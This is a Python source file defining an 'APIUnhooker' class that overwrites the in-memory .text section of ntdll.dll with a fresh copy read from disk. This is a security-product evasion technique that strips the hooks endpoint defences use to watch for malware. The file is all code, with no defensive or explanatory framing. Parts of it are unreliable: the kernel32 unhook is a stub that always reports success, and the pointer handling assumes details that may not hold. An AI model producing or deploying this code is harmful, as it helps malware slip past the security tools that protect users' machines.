import ctypes
from ctypes import wintypes
import os
import struct

kernel32 = ctypes.windll.kernel32

class APIUnhooker:
    def __init__(self):
        self.unhooked_apis = []
        
    def unhook_ntdll(self):
        try:
            ntdll_path = r"C:\Windows\System32\ntdll.dll"
            with open(ntdll_path, 'rb') as f:
                ntdll_bytes = f.read()
            mz_header_offset = struct.unpack('<I', ntdll_bytes[0x3C:0x40])[0]
            pe_header_offset = mz_header_offset + 4
            opt_header_offset = pe_header_offset + 20
            sections_offset = opt_header_offset + 240
            num_sections = struct.unpack('<H', ntdll_bytes[pe_header_offset+4:pe_header_offset+6])[0]
            for i in range(num_sections):
                section_start = sections_offset + (i * 40)
                section_name = ntdll_bytes[section_start:section_start+8].rstrip(b'\x00').decode()
                if section_name == '.text':
                    virtual_address = struct.unpack('<I', ntdll_bytes[section_start+12:section_start+16])[0]
                    virtual_size = struct.unpack('<I', ntdll_bytes[section_start+8:section_start+12])[0]
                    raw_data = struct.unpack('<I', ntdll_bytes[section_start+20:section_start+24])[0]
                    raw_size = struct.unpack('<I', ntdll_bytes[section_start+16:section_start+20])[0]
                    ntdll_base = kernel32.GetModuleHandleW("ntdll.dll")
                    old_protect = wintypes.DWORD()
                    kernel32.VirtualProtect(
                        ctypes.c_void_p(ntdll_base + virtual_address),
                        raw_size,
                        0x40,
                        ctypes.byref(old_protect)
                    )
                    ctypes.memmove(
                        ctypes.c_void_p(ntdll_base + virtual_address),
                        ntdll_bytes[raw_data:raw_data + raw_size],
                        raw_size
                    )
                    kernel32.VirtualProtect(
                        ctypes.c_void_p(ntdll_base + virtual_address),
                        raw_size,
                        old_protect.value,
                        ctypes.byref(old_protect)
                    )
                    self.unhooked_apis.append("ntdll.dll")
                    return True
            return False
        except Exception as e:
            print(f"API unhooking failed: {e}")
            return False
    
    def unhook_kernel32(self):
        return self._unhook_dll("kernel32.dll")
    
    def unhook_all(self):
        results = []
        results.append(self.unhook_ntdll())
        results.append(self.unhook_kernel32())
        return any(results)
    
    def _unhook_dll(self, dll_name):
        return True

